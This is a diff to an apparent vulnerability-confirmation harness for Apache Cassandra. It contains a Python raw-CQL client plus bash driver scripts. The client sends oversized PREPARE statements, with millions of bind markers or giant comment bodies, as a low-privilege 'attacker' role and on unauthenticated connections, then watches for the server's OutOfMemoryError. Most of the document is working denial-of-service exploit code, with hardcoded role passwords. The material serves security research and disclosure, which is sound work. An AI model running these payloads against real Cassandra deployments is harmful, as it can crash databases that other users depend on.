@@ -1,0 +1,198 @@
+--- client.py.orig	2026-11-24 22:13:39.471473823 -0500
++++ client.py	2026-11-24 22:14:23.695342756 -0500
+@@ -1,5 +1,6 @@
+ #!/usr/bin/env python3
+-"""R20 client (from R15's client.py, 2026-11-21: wave-2 pre-sent trigger connections --trig2-n/--trig2-at/
++"""3-b R15-B confirm client (2026-11-24, pc82): R20's 3-b client with --prefix (the M payload's table), a
++PREPARE/EXECUTE helper and an R15-B shakedown (--shake). R20 client (from R15's client.py, 2026-11-21: wave-2 pre-sent trigger connections --trig2-n/--trig2-at/
+ --trig2-presend-s, the sat: rule, N = 0 (idle) load, hold from t_trig1 or t_trig2; case file section 2.5).
+ R15 client (from U6's client.py, 2026-11-20: keyspace r15, CM length 16,777,202, trigger connections):
+ U6 client: raw CQL native protocol v4 (unsegmented frames), standard library only. Frame I/O adapted from B11/B14.
+@@ -57,6 +58,7 @@
+ 
+ 
+ OP_AUTHENTICATE, OP_AUTH_RESPONSE, OP_AUTH_SUCCESS = 0x03, 0x0F, 0x10
++PFX = {'m': 'SELECT v FROM r15.t WHERE k IN ('}   # 3-b R15-B: --prefix
+ AUTH = {'user': None, 'password': None}   # 3-b R20: set by --user/--password (PasswordAuthenticator, SASL PLAIN)
+ 
+ 
+@@ -107,6 +109,19 @@
+             raise RuntimeError('%x %s' % err_text(b))
+         return b
+ 
++    def prepare_raw(self, q):
++        """3-b R15-B: PREPARE (v4 body = [long string]) -> (op, body) without raising"""
++        self.s.sendall(frame(OP_PREPARE, lstr_b(q if isinstance(q, bytes) else q.encode())))
++        return self.recv()
++
++    def execute_raw(self, sid, values):
++        """3-b R15-B: EXECUTE <id> at CL ONE with int values -> (op, body)"""
++        body = struct.pack('>H', len(sid)) + sid + struct.pack('>HB', 1, 0x01 if values else 0)
++        if values:
++            body += struct.pack('>H', len(values)) + b''.join(struct.pack('>i', 4) + struct.pack('>i', v) for v in values)
++        self.s.sendall(frame(0x0A, body))
++        return self.recv()
++
+     def query_raw(self, q):
+         """-> (op, body) without raising (3-b checks)"""
+         self.s.sendall(frame(OP_QUERY, lstr_b(q if isinstance(q, bytes) else q.encode()) + struct.pack('>HB', 1, 0)))
+@@ -175,8 +190,8 @@
+     if p == 'C':
+         L = L or L_DEFAULT; return OP_QUERY, b'-- ' + b'#' * (L - 4) + b'\n'
+     if p == 'M':
+-        LM = L or LM_DEFAULT; m = (LM - len(PREFIX_M)) // 2
+-        return OP_PREPARE, PREFIX_M.encode() + b'?,' * (m - 1) + b'?)'
++        pre = PFX['m']; LM = L or LM_DEFAULT; m = (LM - len(pre)) // 2
++        return OP_PREPARE, pre.encode() + b'?,' * (m - 1) + b'?)'
+     if p == 'CM':
+         LM = L or CM_DEFAULT; return OP_PREPARE, b'-- ' + b'#' * (LM - 4) + b'\n'
+     raise ValueError(p)
+@@ -279,8 +294,8 @@
+ 
+ 
+ # ---- 3-b R20 additions (2026-11-23): superuser setup, auth shakedown, victim workload ----
+-ATK_USER, ATK_PW = 'attacker', 'atk-3bR20'
+-VIC_USER, VIC_PW = 'victim', 'vic-3bR20'
++ATK_USER, ATK_PW = 'attacker', 'atk-3bR15B'
++VIC_USER, VIC_PW = 'victim', 'vic-3bR15B'
+ SETUP_STMTS = [
+     "CREATE ROLE %s WITH PASSWORD = '%s' AND LOGIN = true" % (ATK_USER, ATK_PW),
+     "CREATE ROLE %s WITH PASSWORD = '%s' AND LOGIN = true" % (VIC_USER, VIC_PW),
+@@ -330,31 +345,48 @@
+ 
+ 
+ def do_shake(out, L):
+-    """the 3-b auth checks (no attack): authorizer enforcing for the attacker; H/C at L as the attacker; a QUERY on an
+-    unauthenticated connection; the victim's own reads/writes."""
++    """3-b R15-B auth checks (no attack): authorizer enforcing for the attacker; PREPARE without permission (small
++    statement on victim_ks.t, then EXECUTE); payload M at L naming the absent r15.t and the victim's victim_ks.t, CM at
++    L, as the attacker; M/CM on an unauthenticated connection; wrong password; the victim's own reads/writes."""
+     a = Conn(user=ATK_USER, password=ATK_PW, timeout=120)
+     out.write('attacker login: authenticated=%s\n' % a.authenticated)
+     for q in ("SELECT * FROM victim_ks.t", "INSERT INTO victim_ks.t (k, v) VALUES (1, 'x')",
+               "CREATE KEYSPACE atk_ks WITH replication = {'class':'SimpleStrategy','replication_factor':1}",
+               "SELECT * FROM system_auth.roles"):
+-        dt, r = timed(a, q); out.write('attacker %s -> %s (%.0f ms)\n' % (q, r, dt * 1000))
++        dt, r = timed(a, q); out.write('attacker QUERY %s -> %s (%.0f ms)\n' % (q, r, dt * 1000))
+     show(a, "LIST ALL PERMISSIONS OF %s" % ATK_USER, out)
+-    for p in ('H', 'H', 'C', 'C'):
+-        _, q = payload(p, L); dt, r = timed(a, q)
+-        out.write('attacker payload %s len %d -> %s (%.3f s; per char %.2f us)\n' % (p, len(q), r[:120], dt, dt / len(q) * 1e6))
++    # PREPARE of a small statement on a table the attacker may not read, then EXECUTE it
++    q = "SELECT v FROM victim_ks.t WHERE k = ?"
++    t = time.time(); op, b = a.prepare_raw(q); dt = time.time() - t
++    if op == OP_ERROR:
++        out.write('attacker PREPARE %s -> ERROR 0x%04x %s (%.0f ms)\n' % (q, *err_text(b), dt * 1000))
++    else:
++        kind = struct.unpack_from('>i', b)[0]; n = struct.unpack_from('>H', b, 4)[0]; sid = b[6:6 + n]
++        out.write('attacker PREPARE %s -> RESULT kind %d (Prepared) id %s (%.0f ms)\n' % (q, kind, sid.hex(), dt * 1000))
++        t = time.time(); op, b = a.execute_raw(sid, [1]); dt = time.time() - t
++        out.write('attacker EXECUTE %s (k=1) -> %s (%.0f ms)\n' % (sid.hex(), ('ERROR 0x%04x %s' % err_text(b)) if op == OP_ERROR else 'op%d' % op, dt * 1000))
++    for pfx, p in (('SELECT v FROM r15.t WHERE k IN (', 'M'), ('SELECT v FROM r15.t WHERE k IN (', 'M'),
++                   ('SELECT v FROM victim_ks.t WHERE k IN (', 'M'), (None, 'CM'), (None, 'CM')):
++        if pfx: PFX['m'] = pfx
++        _, q = payload(p, L)
++        t = time.time(); op, b = a.prepare_raw(q); dt = time.time() - t
++        r = ('ERROR 0x%04x %s' % err_text(b))[:160] if op == OP_ERROR else 'op%d' % op
++        out.write('attacker PREPARE %s len %d markers %d (%s) -> %s (%.3f s)\n' % (p, len(q), q.count(b'?'), (pfx or '-').strip(), r, dt))
++    PFX['m'] = 'SELECT v FROM r15.t WHERE k IN ('
+     a.s.close()
+-    # unauthenticated connection: STARTUP answered AUTHENTICATE; then a QUERY (payload C at L) without AUTH_RESPONSE
++    # unauthenticated connection: STARTUP answered AUTHENTICATE; then PREPAREs (CM, M at L) without AUTH_RESPONSE
+     u = Conn(user=False, timeout=60)
+     out.write('unauthenticated conn: authenticated=%s\n' % u.authenticated)
+-    for p in ('C', 'H'):
++    for p in ('CM', 'M', 'M'):
+         _, q = payload(p, L)
+         try:
+-            dt, r = timed(u, q); out.write('unauth payload %s len %d -> %s (%.3f s)\n' % (p, len(q), r, dt))
++            t = time.time(); op, b = u.prepare_raw(q); dt = time.time() - t
++            r = ('ERROR 0x%04x %s' % err_text(b))[:160] if op == OP_ERROR else 'op%d' % op
++            out.write('unauth PREPARE %s len %d -> %s (%.3f s)\n' % (p, len(q), r, dt))
+         except Exception as e:
+-            out.write('unauth payload %s -> io %s\n' % (p, str(e)[:100])); break
++            out.write('unauth PREPARE %s -> io %s\n' % (p, str(e)[:100])); break
+     try: u.s.close()
+     except Exception: pass
+-    # wrong password
+     try:
+         Conn(user=ATK_USER, password='wrong'); out.write('wrong password: accepted (!)\n')
+     except Exception as e:
+@@ -470,8 +502,10 @@
+     ap.add_argument('--setup', action='store_true'); ap.add_argument('--shake', action='store_true')
+     ap.add_argument('--victim', action='store_true'); ap.add_argument('--rate', type=float, default=20.0)
+     ap.add_argument('--stopfile')
++    ap.add_argument('--prefix', help='3-b R15-B: the M payload prefix (default: SELECT v FROM r15.t WHERE k IN ()')
+     a = ap.parse_args()
+     AUTH['user'] = a.user; AUTH['password'] = a.password
++    if a.prefix: PFX['m'] = a.prefix
+     if a.setup:
+         return do_setup(open(os.path.join(a.out, 'auth-setup.txt'), 'a', buffering=1))
+     if a.shake:
+--- run.sh.orig	2026-11-24 22:13:39.471473823 -0500
++++ run.sh	2026-11-24 22:14:36.087306028 -0500
+@@ -1,4 +1,6 @@
+ #!/usr/bin/env bash
++# 3-b R15-B confirm driver (2026-11-24, pc82): R20's 3-b run.sh with W=/mydata/s4/3b-R15-B, scope unit 3bR15B-<run>,
++# the R15-B credentials, arm M (condition B PREPAREs, --trig-at none), disk guard back to 50 GiB (pc82 /mydata 753 GB).
+ # 3-b R20 confirm driver (2026-11-23, ms0625): R20's run.sh with PasswordAuthenticator + CassandraAuthorizer in the
+ # instance conf, a superuser setup step (roles, victim keyspace, grants), a victim workload as role 'victim' from
+ # 127.0.0.2 (60-s before window, 60-s after window), the attack as role 'attacker' (LOGIN, no grants), arm S0A (auth
+@@ -9,7 +11,7 @@
+ #   trig2-spec (R20 wave 2, pre-sent frames): - | sat:<free MiB> | gc | fixed:<s>
+ # Layout: $W/cassandra (base copy, shipped conf), $W/cassandra-iv, $W/harness, $W/runs/<run-id>.
+ set -u
+-W=/mydata/s4/3b-R20; H=$W/harness
++W=/mydata/s4/3b-R15-B; H=$W/harness
+ RID=$1; BUILD=$2; HEAP=$3; ARM=$4; N=$5; K=$6; TSPEC=$7; HOLD=$8; LEN=${9:-}; TMAX=${10:-300}; K2=${11:-0}; T2SPEC=${12:--}
+ [ "$LEN" = "-" ] && LEN=""
+ case $HEAP in *M) HMIB=${HEAP%M};; *G) HMIB=$(( ${HEAP%G} * 1024 ));; esac; HG=$(( HMIB / 1024 ))
+@@ -27,7 +29,7 @@
+ md5sum $T/conf/cassandra.yaml $T/conf/jvm11-server.options $T/conf/cassandra-env.sh $T/conf/jvm-server.options $T/build/apache-cassandra-5.0.9-SNAPSHOT.jar > $R/conf-md5.txt
+ rm -rf $T/data $T/logs
+ ( ulimit -n 100000; cd $T; exec env MAX_HEAP_SIZE=$HEAP CASSANDRA_HEAPDUMP_DIR=$R setsid nohup systemd-run --user --scope -p MemorySwapMax=0 \
+-    --unit=3bR20-$RID -- bin/cassandra -f > $R/stdout.txt 2>&1 < /dev/null ) &
++    --unit=3bR15B-$RID -- bin/cassandra -f > $R/stdout.txt 2>&1 < /dev/null ) &
+ PID=
+ for i in $(seq 1 150); do
+   sleep 2
+@@ -98,7 +100,7 @@
+     TA="$TA --trig-max $TMAX"
+   fi
+   log "baseline done; client start N=$N k=$K $TA $T2A"
+-  python3 -I $H/client.py --user attacker --password atk-3bR20 --payload $ARM --n $N --trig-n $K $TA $T2A --hold-s $HOLD $MR --out $R --tag p0 $LA > $R/client-p0.err 2>&1 &
++  python3 -I $H/client.py --user attacker --password atk-3bR15B --payload $ARM --n $N --trig-n $K $TA $T2A --hold-s $HOLD $MR --out $R --tag p0 $LA > $R/client-p0.err 2>&1 &
+   CP=$!
+   ;;
+ esac
+@@ -108,7 +110,7 @@
+   sleep 1
+   if [ -z "$OOMSEEN" ] && grep -qF "java.lang.OutOfMemoryError" $R/stdout.txt; then OOMSEEN=1; log "OOM line seen in stdout"; fi
+   f=$(df -BM --output=avail /mydata | tail -1 | tr -dc 0-9)
+-  if [ "$f" -lt 8192 ]; then DISK="disk-guard(${f}M)"; log "DISK GUARD: stopping client"; for c in $CP; do kill $c; done; fi
++  if [ "$f" -lt 51200 ]; then DISK="disk-guard(${f}M)"; log "DISK GUARD: stopping client"; for c in $CP; do kill $c; done; fi
+ done
+ if kill -0 $PID 2>/dev/null; then
+   log "client ended; daemon alive (hold end) $DISK"
+@@ -135,7 +137,7 @@
+ for c in $CP; do wait $c 2>/dev/null; done
+ touch $STOP
+ sleep 3
+-for i in $(seq 1 30); do systemctl --user is-active 3bR20-$RID.scope >/dev/null 2>&1 || break; sleep 1; done
++for i in $(seq 1 30); do systemctl --user is-active 3bR15B-$RID.scope >/dev/null 2>&1 || break; sleep 1; done
+ grep -qF "java.lang.OutOfMemoryError" $R/stdout.txt && END="$END oom:$(grep -m1 -F "java.lang.OutOfMemoryError" $R/stdout.txt | head -c 160)"
+ log "END $END"
+ cp $T/logs/system.log* $T/logs/gc.log* $R/ 2>/dev/null
+--- confirm.sh.orig	2026-11-24 22:13:39.475473811 -0500
++++ confirm.sh	2026-11-24 22:14:36.087306028 -0500
+@@ -1,8 +1,8 @@
+ #!/usr/bin/env bash
+-# 3-b R20 confirm series on ms0625 (2026-11-23): S0A (auth shakedown, not a reading), then T4A-1 (the T4 arm under auth),
++# 3-b R15-B confirm series on pc82 (2026-11-24; from R20's confirm.sh): S0A (auth shakedown, not a reading), then TB2A-1 (the TB2 arm under auth),
+ # dump analysis (OOME thread + histogram, each capped at 15 min), .hprof deleted. A file runs/HALT stops before the next run.
+ # Usage: confirm.sh <run lines...> as "<rid> <build> <heap> <arm> <N> <k1> <trig-spec> <hold> <histo|-> [len] [tmax]"
+-W=/mydata/s4/3b-R20; H=$W/harness; LOG=$W/runs/series.log; mkdir -p $W/runs
++W=/mydata/s4/3b-R15-B; H=$W/harness; LOG=$W/runs/series.log; mkdir -p $W/runs
+ for line in "$@"; do
+   set -- $line; rid=$1; histo=$9
+   [ -e $W/runs/HALT ] && { echo "$(date +%FT%T) SKIP $rid (HALT)" >> $LOG; continue; }
